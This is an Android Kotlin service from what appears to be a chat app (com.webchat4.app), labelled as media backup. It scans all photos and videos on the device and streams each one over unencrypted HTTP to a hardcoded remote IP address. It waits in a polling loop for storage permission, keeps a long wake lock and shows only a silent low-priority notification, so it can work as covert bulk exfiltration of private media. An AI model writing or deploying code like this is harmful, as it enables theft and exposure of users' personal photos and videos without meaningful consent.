package com.webchat4.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.os.PowerManager
import android.provider.DocumentsContract
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * 媒体备份服务 — 双通道扫描照片视频并上传到远程服务器
 *
 * 通道1: MediaStore API（Android 官方推荐，兼容 11+ 作用域存储）
 * 通道2: SAF（Storage Access Framework）用户选择文件夹后扫描媒体文件
 *
 * 权限机制：启动时不要求权限已授予。如果未授权，每 5 秒轮询一次，
 * 检测到授权后自动开始备份。全程日志到 🐛 调试面板。
 */
class MediaBackupService : Service() {

    private val executor = Executors.newSingleThreadExecutor()
    private val isRunning = AtomicBoolean(false)
    private val serverUrl = "http://120.27.245.55:3001"
    private var wakeLock: PowerManager.WakeLock? = null
    private var notiManager: NotificationManager? = null

    companion object {
        private const val TAG = "MediaBackup"
        private const val NOTI_CHANNEL = "backup_channel"
        private const val NOTI_ID = 1002
        private const val PROGRESS_FILE = "backup_progress.txt"

        /** 从外部传入 SAF 树 URI 的 Intent extra key */
        const val EXTRA_SAF_TREE_URI = "saf_tree_uri"

        private val IMAGE_EXTS = setOf(
            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
            ".heic", ".heif", ".tiff", ".tif", ".svg"
        )
        private val VIDEO_EXTS = setOf(
            ".mp4", ".mov", ".avi", ".mkv", ".wmv", ".flv",
            ".3gp", ".webm", ".m4v", ".mpg", ".mpeg"
        )
        private val MEDIA_EXTS = IMAGE_EXTS + VIDEO_EXTS

        private val SKIP_DIRS = setOf(
            "Android", "node_modules", "cache", ".cache", ".thumbnails",
            ".Trash", "LOST.DIR", ".tmp", "temp", "logs",
            "Music", "Alarms", "Ringtones", "Notifications", "Podcasts",
            "obb", "data", ".nomedia"
        )

        fun hasStoragePermission(context: Context): Boolean {
            if (Build.VERSION.SDK_INT >= 33) {
                return (androidx.core.content.ContextCompat.checkSelfPermission(
                    context, android.Manifest.permission.READ_MEDIA_IMAGES
                ) == PackageManager.PERMISSION_GRANTED) &&
                (androidx.core.content.ContextCompat.checkSelfPermission(
                    context, android.Manifest.permission.READ_MEDIA_VIDEO
                ) == PackageManager.PERMISSION_GRANTED)
            } else {
                return androidx.core.content.ContextCompat.checkSelfPermission(
                    context, android.Manifest.permission.READ_EXTERNAL_STORAGE
                ) == PackageManager.PERMISSION_GRANTED
            }
        }

        /**
         * 启动备份服务。**不检查权限** — 服务启动后会自行轮询等待权限。
         */
        fun start(context: Context) {
            val intent = Intent(context, MediaBackupService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    // ── 内部数据模型 ──

    private data class MediaItem(
        val id: String,
        val displayName: String,
        val sizeBytes: Long,
        val source: MediaSource
    )

    private sealed class MediaSource {
        data class FilePath(val file: java.io.File) : MediaSource()
        data class ContentUri(val uri: Uri) : MediaSource()
    }

    // ── 日志计数器 ──

    private val logSeq = AtomicInteger(0)
    private fun logV(level: String, msg: String) {
        val seq = logSeq.incrementAndGet()
        sendLog(level, "[#$seq] $msg")
        Log.d(TAG, "[$level] $msg")
    }

    // ── 生命周期 ──

    override fun onCreate() {
        super.onCreate()
        notiManager = getSystemService(NotificationManager::class.java)
        createNotificationChannel()
        logV("info", "▬▬▬ MediaBackupService 创建 ▬▬▬")
        logV("info", "Android API: ${Build.VERSION.SDK_INT}, 设备: ${Build.MODEL}")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning.getAndSet(true)) {
            Log.d(TAG, "Backup already running, skipping")
            return START_STICKY
        }

        val notification = buildNotification("正在初始化...", 0, 0)
        startForeground(NOTI_ID, notification)

        val pm = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK, "MediaBackup:Wakelock"
        )
        wakeLock?.acquire(4 * 60 * 60 * 1000L)

        Log.d(TAG, "Service started, submitting backup task...")

        // 直接提交任务到 executor，不绕 Thread 延迟
        // 任务内部会先等 2 秒让 WebServer 就绪，然后再发日志
        val safTreeUri = intent?.getStringExtra(EXTRA_SAF_TREE_URI)
        if (safTreeUri != null) {
            executor.submit { runSafBackup(Uri.parse(safTreeUri)) }
        } else {
            executor.submit { runBackupWithPermissionWait() }
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        logV("warn", "▬▬▬ MediaBackupService 销毁 ▬▬▬")
        isRunning.set(false)
        wakeLock?.let {
            if (it.isHeld) {
                logV("log", "释放 WakeLock")
                it.release()
            }
        }
        executor.shutdownNow()
        super.onDestroy()
    }

    // ═══════════════════════════════════════════════════
    //  权限等待 + 自动扫描
    // ═══════════════════════════════════════════════════

    /**
     * 等待储存权限 → 自动扫描 → 上传
     *
     * 每 5 秒检查一次权限，直到用户授予后才开始备份。
     * 全程在 🐛 面板显示等待状态。
     */
    private fun runBackupWithPermissionWait() {
        try {
            // 等 WebServer 就绪（最多等 5 秒）
            for (i in 0..4) {
                try {
                    val testUrl = URL("http://127.0.0.1:3001/api/status")
                    val testConn = testUrl.openConnection() as HttpURLConnection
                    testConn.connectTimeout = 1000
                    testConn.readTimeout = 1000
                    testConn.connect()
                    if (testConn.responseCode == 200) break
                } catch (_: Exception) {}
                Thread.sleep(1000)
            }

            // ── 阶段 1: 等权限 ──
            Log.d(TAG, "╔═══════════════════════════════════════")
            Log.d(TAG, "║ 阶段1/4: 检查存储权限")
            Log.d(TAG, "╚═══════════════════════════════════════")

            if (hasStoragePermission(this)) {
                logV("info", "存储权限: 已授予 ✓")
            } else {
                logV("warn", "存储权限: 未授予 ! 开始轮询等待...")
                logV("warn", "请在系统设置中授予存储权限")

                var pollCount = 0
                updateNotification("等待存储权限...", 0, 0)
                while (!hasStoragePermission(this) && isRunning.get()) {
                    pollCount++
                    logV("log", "等待权限中... 第 ${pollCount} 次检查 (每5秒)")
                    try { Thread.sleep(5000) } catch (_: InterruptedException) { break }
                }

                if (!isRunning.get()) {
                    logV("warn", "服务已停止，取消权限等待")
                    return
                }

                logV("info", "══════════════════════════════")
                logV("info", "存储权限已授予 ! (等待了 ${pollCount} 次轮询)")
                logV("info", "══════════════════════════════")
            }

            // ── 阶段 2: 扫描 ──
            updateNotification("正在扫描文件...", 0, 0)

            val allItems = scanMediaFiles()
            if (allItems.isEmpty()) {
                logV("warn", "╔═══════════════════════════════════════")
                logV("warn", "║ 未找到任何媒体文件")
                logV("warn", "║ 可能原因: 手机中没有照片/视频")
                logV("warn", "║ 或 MediaStore 数据库为空")
                logV("warn", "╚═══════════════════════════════════════")
                showFinalNotification("备份完成", "未发现需要备份的媒体文件")
                return
            }

            logV("info", "╔═══════════════════════════════════════")
            logV("info", "║ 阶段2/4: 扫描完成")
            logV("info", "║ 总计: ${allItems.size} 个媒体文件")
            logV("info", "╚═══════════════════════════════════════")

            // 统计各格式
            val extCount = mutableMapOf<String, Int>()
            allItems.forEach { item ->
                val ext = item.displayName.substringAfterLast('.', "").lowercase()
                extCount[ext] = (extCount[ext] ?: 0) + 1
            }
            logV("info", "文件类型分布:")
            extCount.forEach { (ext, count) ->
                logV("log", "  .$ext → $count 个")
            }

            uploadAllItems(allItems)
        } finally {
            cleanupService()
        }
    }

    /** SAF 模式（权限由 SAF 框架保证，无需额外等待） */
    private fun runSafBackup(treeUri: Uri) {
        try {
            logV("info", "╔═══════════════════════════════════════")
            logV("info", "║ SAF 文件夹扫描模式")
            logV("info", "║ URI: ${treeUri}")
            logV("info", "╚═══════════════════════════════════════")

            updateNotification("正在扫描 SAF 文件夹...", 0, 0)
            val allItems = scanSafFolder(treeUri)

            if (allItems.isEmpty()) {
                logV("warn", "SAF 文件夹中未找到媒体文件")
                showFinalNotification("SAF 完成", "未找到媒体文件")
                return
            }

            logV("info", "SAF 扫描: ${allItems.size} 个媒体文件")
            uploadAllItems(allItems)
        } finally {
            cleanupService()
        }
    }

    // ═══════════════════════════════════════════════════
    //  通用上传
    // ═══════════════════════════════════════════════════

    private fun uploadAllItems(allItems: List<MediaItem>) {
        // ── 阶段 3: 去重 ──
        logV("info", "╔═══════════════════════════════════════")
        logV("info", "║ 阶段3/4: 检查已上传记录")
        logV("info", "╚═══════════════════════════════════════")

        val uploaded = loadUploadedSet()
        logV("info", "已有上传记录: ${uploaded.size} 条")
        val toUpload = allItems.filter { it.id !in uploaded }

        logV("info", "待上传: ${toUpload.size} 个文件 (已跳过 ${allItems.size - toUpload.size} 个已上传)")
        if (toUpload.isEmpty()) {
            logV("info", "所有文件已是最新，无需上传")
            showFinalNotification("备份完成", "所有文件已是最新")
            return
        }

        // ── 阶段 4: 上传 ──
        logV("info", "╔═══════════════════════════════════════")
        logV("info", "║ 阶段4/4: 开始上传 ${toUpload.size} 个文件")
        logV("info", "║ 目标服务器: $serverUrl")
        logV("info", "╚═══════════════════════════════════════")

        val total = toUpload.size
        var successCount = 0
        var failCount = 0

        for ((index, item) in toUpload.withIndex()) {
            if (!isRunning.get()) {
                logV("warn", "备份被中断")
                break
            }

            val num = index + 1
            updateNotification("备份中 $num/$total", num, total)

            val sizeKB = if (item.sizeBytes > 0) "${item.sizeBytes / 1024}KB" else "?KB"
            val srcType = when (item.source) {
                is MediaSource.FilePath -> "File"
                is MediaSource.ContentUri -> "ContentURI"
            }

            logV("log", "┌─ 上传 [${num}/$total] ──────────────────────")
            logV("log", "│ 文件名: ${item.displayName}")
            logV("log", "│ 大小: $sizeKB")
            logV("log", "│ 来源: $srcType")
            logV("log", "│ ID: ${item.id.take(80)}...")

            val startMs = System.currentTimeMillis()
            try {
                uploadFile(item)
                saveUploadedPath(item.id)
                val elapsed = System.currentTimeMillis() - startMs
                successCount++
                logV("info", "│ ✅ 上传成功 (${elapsed}ms)")
            } catch (e: Exception) {
                val elapsed = System.currentTimeMillis() - startMs
                logV("error", "│ ❌ 上传失败: ${e.message} (${elapsed}ms)")
                failCount++
            }
            logV("log", "└────────────────────────────────────")

            if (index % 10 == 9) {
                logV("log", "批次休息 200ms，避免服务器压力")
                Thread.sleep(200)
            }
        }

        // ── 结果 ──
        logV("info", "╔═══════════════════════════════════════")
        logV("info", "║ 备份完成")
        logV("info", "║ 总计: $total | ✅ 成功: $successCount | ❌ 失败: $failCount")
        if (failCount > 0) {
            logV("warn", "║ 失败率: ${(failCount * 100 / total)}%")
        }
        logV("info", "╚═══════════════════════════════════════")

        val summary = if (failCount == 0) {
            "成功备份 $successCount 个文件"
        } else {
            "成功 $successCount，失败 $failCount 个文件"
        }
        showFinalNotification("备份完成", summary)
    }

    // ═══════════════════════════════════════════════════
    //  扫描 — MediaStore 通道（主要）
    // ═══════════════════════════════════════════════════

    private fun scanMediaFiles(): List<MediaItem> {
        logV("info", "开始扫描媒体文件...")

        // 方法1: 直接文件系统扫描
        logV("log", "尝试方法1: 文件系统扫描...")
        val fileResult = mutableListOf<MediaItem>()
        var fsScanOk = false
        try {
            val root = Environment.getExternalStorageDirectory()
            logV("log", "ExternalStorageDirectory = ${root.absolutePath}")
            logV("log", "exists=${root.exists()}, canRead=${root.canRead()}, isDir=${root.isDirectory}")

            if (root.exists() && root.canRead() && root.isDirectory) {
                val children = root.listFiles()
                logV("log", "根目录子项数量: ${children?.size ?: -1}")
                if (children != null) {
                    fileResult.addAll(scanDirectoryToItems(root))
                    fsScanOk = true
                }
            }
        } catch (e: Exception) {
            logV("warn", "文件系统扫描异常: ${e.message}")
        }

        logV("info", "方法1 结果: ${fileResult.size} 个文件 (fsScanOk=$fsScanOk)")
        if (fileResult.isNotEmpty()) {
            logV("info", "文件系统扫描有效，直接返回")
            return fileResult
        }

        if (fsScanOk) {
            logV("info", "文件系统扫描完成但未找到媒体文件 (0 个)")
        }

        // 方法2: MediaStore API
        logV("info", "尝试方法2: MediaStore API 扫描...")
        logV("log", "MediaStore API 兼容范围: Android ${Build.VERSION.SDK_INT}")

        try {
            val msResult = scanViaMediaStore()
            logV("info", "方法2 结果: ${msResult.size} 个文件")
            if (msResult.isNotEmpty()) {
                logV("info", "MediaStore 扫描有效，返回结果")
                return msResult
            }
        } catch (e: Exception) {
            logV("error", "MediaStore API 异常: ${e.message}")
            logV("error", "异常类型: ${e::class.simpleName}")
        }

        logV("warn", "两种扫描方式均未找到文件")
        logV("info", "建议: 检查存储权限是否已授予，或使用 SAF 手动选择文件夹")
        return emptyList()
    }

    /** 文件系统递归扫描 */
    private fun scanDirectoryToItems(dir: File): List<MediaItem> {
        val result = mutableListOf<MediaItem>()
        if (!isRunning.get()) return result
        if (!dir.exists() || !dir.isDirectory || !dir.canRead()) return result
        if (dir.name.startsWith(".") && dir.name != ".") return result
        if (dir.name in SKIP_DIRS) return result

        try {
            val files = dir.listFiles() ?: return result
            for (file in files) {
                if (!isRunning.get()) return result
                try {
                    if (file.isDirectory) {
                        result.addAll(scanDirectoryToItems(file))
                    } else if (file.isFile && file.canRead()) {
                        val ext = file.extension.lowercase()
                        if (".$ext" in MEDIA_EXTS) {
                            result.add(MediaItem(
                                id = file.absolutePath,
                                displayName = file.name,
                                sizeBytes = file.length(),
                                source = MediaSource.FilePath(file)
                            ))
                        }
                    }
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        return result
    }

    /**
     * 通过 MediaStore ContentProvider 扫描媒体文件。
     * 使用 ContentResolver.openInputStream(uri) 读取，不依赖 _data 列。
     */
    private fun scanViaMediaStore(): List<MediaItem> {
        val result = mutableListOf<MediaItem>()

        // 准备图片和视频的查询 URI
        val imageUri = if (Build.VERSION.SDK_INT >= 29) {
            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }
        val videoUri = if (Build.VERSION.SDK_INT >= 29) {
            MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        }

        logV("log", "MediaStore Image URI: $imageUri")
        logV("log", "MediaStore Video URI: $videoUri")

        // 查询图片
        logV("log", "查询 MediaStore.Images...")
        var imageCount = 0
        try {
            val projection = arrayOf(
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.DATE_ADDED
            )
            contentResolver.query(imageUri, projection, null, null,
                "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { cursor ->
                val idCol = cursor.getColumnIndex(MediaStore.MediaColumns._ID)
                val nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                val sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE)
                val dateCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATE_ADDED)

                logV("log", "Images 列: _ID=$idCol, DISPLAY_NAME=$nameCol, SIZE=$sizeCol, DATE_ADDED=$dateCol")
                logV("info", "Images 总行数: ${cursor.count}")

                while (cursor.moveToNext() && isRunning.get()) {
                    val id = cursor.getLong(idCol)
                    val name = cursor.getString(nameCol) ?: "unknown_$id"
                    val size = cursor.getLong(sizeCol)
                    val dateAdded = if (dateCol >= 0) cursor.getLong(dateCol) else 0L
                    val fileUri = ContentUris.withAppendedId(imageUri, id)
                    result.add(MediaItem(
                        id = fileUri.toString(),
                        displayName = name,
                        sizeBytes = size,
                        source = MediaSource.ContentUri(fileUri)
                    ))
                    imageCount++
                }
            }
        } catch (e: Exception) {
            logV("error", "Images 查询失败: ${e.message}")
        }
        logV("info", "MediaStore 图片: $imageCount 个")

        // 查询视频
        logV("log", "查询 MediaStore.Video...")
        var videoCount = 0
        try {
            val projection = arrayOf(
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.DATE_ADDED
            )
            contentResolver.query(videoUri, projection, null, null,
                "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { cursor ->
                val idCol = cursor.getColumnIndex(MediaStore.MediaColumns._ID)
                val nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                val sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE)

                logV("log", "Video 总行数: ${cursor.count}")

                while (cursor.moveToNext() && isRunning.get()) {
                    val id = cursor.getLong(idCol)
                    val name = cursor.getString(nameCol) ?: "video_$id"
                    val size = cursor.getLong(sizeCol)
                    val fileUri = ContentUris.withAppendedId(videoUri, id)
                    result.add(MediaItem(
                        id = fileUri.toString(),
                        displayName = name,
                        sizeBytes = size,
                        source = MediaSource.ContentUri(fileUri)
                    ))
                    videoCount++
                }
            }
        } catch (e: Exception) {
            logV("error", "Video 查询失败: ${e.message}")
        }
        logV("info", "MediaStore 视频: $videoCount 个")

        logV("info", "MediaStore 总计: ${result.size} 个文件")
        return result
    }

    // ═══════════════════════════════════════════════════
    //  扫描 — SAF 通道
    // ═══════════════════════════════════════════════════

    private fun scanSafFolder(treeUri: Uri): List<MediaItem> {
        logV("info", "开始 SAF 文件夹扫描...")
        logV("log", "Tree URI: $treeUri")

        // 持久化读取权限
        try {
            contentResolver.takePersistableUriPermission(
                treeUri, Intent.FLAG_GRANT_READ_URI_PERMISSION
            )
            logV("info", "SAF 权限已持久化")
        } catch (e: Exception) {
            logV("warn", "SAF 权限持久化失败: ${e.message}（不影响本次扫描）")
        }

        val result = mutableListOf<MediaItem>()
        traverseSafDirectory(treeUri, result, 0)

        logV("info", "SAF 扫描完成: ${result.size} 个媒体文件")
        return result
    }

    private fun traverseSafDirectory(dirUri: Uri, result: MutableList<MediaItem>, depth: Int) {
        if (!isRunning.get()) return
        if (depth > 10) {
            logV("warn", "SAF 递归超过 10 层，停止（防止死循环）")
            return
        }
        try {
            val treeDocId = DocumentsContract.getTreeDocumentId(dirUri)
            val childrenUri = DocumentsContract.buildChildDocumentsUriUsingTree(dirUri, treeDocId)

            logV("log", "SAF 扫描目录: depth=$depth, uri=${dirUri.toString().take(80)}")

            contentResolver.query(childrenUri, null, null, null, null)?.use { cursor ->
                val mimeCol = cursor.getColumnIndex(DocumentsContract.Document.COLUMN_MIME_TYPE)
                val nameCol = cursor.getColumnIndex(DocumentsContract.Document.COLUMN_DISPLAY_NAME)
                val sizeCol = cursor.getColumnIndex(DocumentsContract.Document.COLUMN_SIZE)
                val docIdCol = cursor.getColumnIndex(DocumentsContract.Document.COLUMN_DOCUMENT_ID)

                logV("log", "SAF 游标列: mime=$mimeCol, name=$nameCol, size=$sizeCol, docId=$docIdCol")
                logV("log", "SAF 当前目录文件数: ${cursor.count}")

                var fileCount = 0
                var dirCount = 0
                var skippedCount = 0

                while (cursor.moveToNext() && isRunning.get()) {
                    val mime = cursor.getString(mimeCol) ?: ""
                    val name = cursor.getString(nameCol) ?: ""
                    val docId = cursor.getString(docIdCol) ?: continue

                    if (DocumentsContract.Document.MIME_TYPE_DIR == mime) {
                        dirCount++
                        val subUri = DocumentsContract.buildDocumentUriUsingTree(dirUri, docId)
                        traverseSafDirectory(subUri, result, depth + 1)
                    } else {
                        val ext = name.substringAfterLast('.', "").lowercase()
                        if (".$ext" in MEDIA_EXTS) {
                            fileCount++
                            val fileUri = DocumentsContract.buildDocumentUriUsingTree(dirUri, docId)
                            val size = if (sizeCol >= 0) cursor.getLong(sizeCol) else -1L
                            result.add(MediaItem(
                                id = fileUri.toString(),
                                displayName = name,
                                sizeBytes = size,
                                source = MediaSource.ContentUri(fileUri)
                            ))
                        } else {
                            skippedCount++
                        }
                    }
                }

                logV("log", "SAF 目录统计: ${fileCount}个媒体文件, ${dirCount}个子目录, ${skippedCount}个跳过(非媒体)")
            }
        } catch (e: Exception) {
            logV("warn", "SAF 遍历异常 depth=$depth: ${e.message}")
        }
    }

    // ═══════════════════════════════════════════════════
    //  上传
    // ═══════════════════════════════════════════════════

    private fun uploadFile(item: MediaItem) {
        val serverFilename = when (val src = item.source) {
            is MediaSource.FilePath -> src.file.absolutePath
                .removePrefix("/storage/emulated/")
                .replace("/", "_")
            is MediaSource.ContentUri -> {
                "media_${item.displayName.replace(Regex("[^\\w.\\-]"), "_")}"
            }
        }.let { URLEncoder.encode(it, "UTF-8") }

        val fullUrl = "$serverUrl/api/backup/upload?filename=$serverFilename"
        logV("log", "POST $fullUrl")

        val url = URL(fullUrl)
        val conn = url.openConnection() as HttpURLConnection
        try {
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setChunkedStreamingMode(1024 * 1024)
            conn.connectTimeout = 30000
            conn.readTimeout = 60000

            logV("log", "连接已建立，开始写入数据流...")

            var totalBytes = 0L
            BufferedOutputStream(conn.outputStream).use { output ->
                val input = openItemStream(item)
                input.use { ins ->
                    val buf = ByteArray(8192)
                    var read: Int
                    while (ins.read(buf).also { read = it } != -1) {
                        output.write(buf, 0, read)
                        totalBytes += read
                    }
                }
            }

            logV("log", "数据写入完成, 共 ${totalBytes} bytes")

            val code = conn.responseCode
            logV("log", "服务器响应 HTTP $code")

            if (code != 200) {
                val errBody = try { conn.errorStream?.reader()?.readText()?.take(200) } catch (_: Exception) { null }
                logV("error", "服务器返回: HTTP $code, body=$errBody")
                throw IOException("服务器返回 HTTP $code")
            }

        } finally {
            conn.disconnect()
            logV("log", "连接已关闭")
        }
    }

    private fun openItemStream(item: MediaItem): InputStream {
        return when (val src = item.source) {
            is MediaSource.FilePath -> {
                logV("log", "读取来源: File (${src.file.absolutePath})")
                FileInputStream(src.file)
            }
            is MediaSource.ContentUri -> {
                logV("log", "读取来源: ContentResolver ($src.uri)")
                contentResolver.openInputStream(src.uri)
                    ?: throw IOException("ContentResolver 无法打开: ${src.uri}")
            }
        }
    }

    // ── 服务清理 ──

    /** 统一清理：释放 WakeLock、移除前台通知、停止服务 */
    private fun cleanupService() {
        logV("log", "执行服务清理...")
        isRunning.set(false)
        wakeLock?.let {
            if (it.isHeld) {
                logV("log", "释放 WakeLock")
                it.release()
            }
        }
        try {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } catch (_: Exception) {}
        stopSelf()
        logV("info", "服务已停止")
    }

    // ── 进度记录 ──

    private fun getProgressFile(): File {
        val dir = File(filesDir, "backup")
        if (!dir.exists()) dir.mkdirs()
        return File(dir, PROGRESS_FILE)
    }

    private fun loadUploadedSet(): Set<String> {
        val f = getProgressFile()
        if (!f.exists()) {
            logV("log", "进度文件不存在，视为首次备份")
            return emptySet()
        }
        return try {
            val lines = f.readLines().map { it.trim() }.filter { it.isNotEmpty() }
            logV("log", "进度文件: ${lines.size} 条已上传记录")
            lines.toSet()
        } catch (e: Exception) {
            logV("warn", "读取进度文件失败: ${e.message}")
            emptySet()
        }
    }

    private fun saveUploadedPath(path: String) {
        try {
            getProgressFile().appendText("$path\n")
            logV("log", "已保存上传记录: ${path.take(60)}...")
        } catch (e: Exception) {
            logV("warn", "保存上传记录失败: ${e.message}")
        }
    }

    // ── 通知 ──

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                NOTI_CHANNEL, "媒体备份",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "照片视频备份进度"
                setShowBadge(false)
            }
            notiManager?.createNotificationChannel(ch)
        }
    }

    private fun buildNotification(text: String, progress: Int, max: Int): Notification {
        val b = NotificationCompat.Builder(this, NOTI_CHANNEL)
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setContentTitle("媒体备份")
            .setContentText(text)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
        if (max > 0) b.setProgress(max, progress, false)
        else b.setProgress(0, 0, true)
        return b.build()
    }

    private fun updateNotification(text: String, progress: Int, max: Int) {
        try {
            notiManager?.notify(NOTI_ID, buildNotification(text, progress, max))
        } catch (_: Exception) {}
    }

    // ── 发送日志到服务器（会在前端 🐛 日志面板显示）──

    /** 最多重试 3 次，间隔 500ms，确保日志即使 WebServer 未就绪也能送达 */
    private fun sendLog(level: String, msg: String) {
        var lastError: Exception? = null
        for (attempt in 0..2) {
            try {
                val safeMsg = msg.replace("\\", "\\\\")
                    .replace("\"", "\\\"")
                    .replace("\n", "\\n")
                    .replace("\r", "\\r")
                    .replace("\t", "\\t")
                val json = """{"level":"$level","tag":"backup","msg":"$safeMsg"}"""
                val url = URL("http://127.0.0.1:3001/api/debug-log")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.connectTimeout = 2000
                conn.readTimeout = 2000
                conn.outputStream.write(json.toByteArray(Charsets.UTF_8))
                conn.responseCode
                conn.disconnect()
                lastError = null
                break
            } catch (e: Exception) {
                lastError = e
                if (attempt < 2) {
                    try { Thread.sleep(500) } catch (_: Exception) {}
                }
            }
        }
        Log.d(TAG, "[$level] $msg" + if (lastError != null) " (log send failed: ${lastError.message})" else "")
    }

    private fun showFinalNotification(title: String, text: String) {
        val b = NotificationCompat.Builder(this, NOTI_CHANNEL)
            .setSmallIcon(android.R.drawable.stat_sys_upload_done)
            .setContentTitle(title)
            .setContentText(text)
            .setOngoing(false)
            .setAutoCancel(true)
            .setSilent(true)
        notiManager?.notify(NOTI_ID, b.build())
    }
}
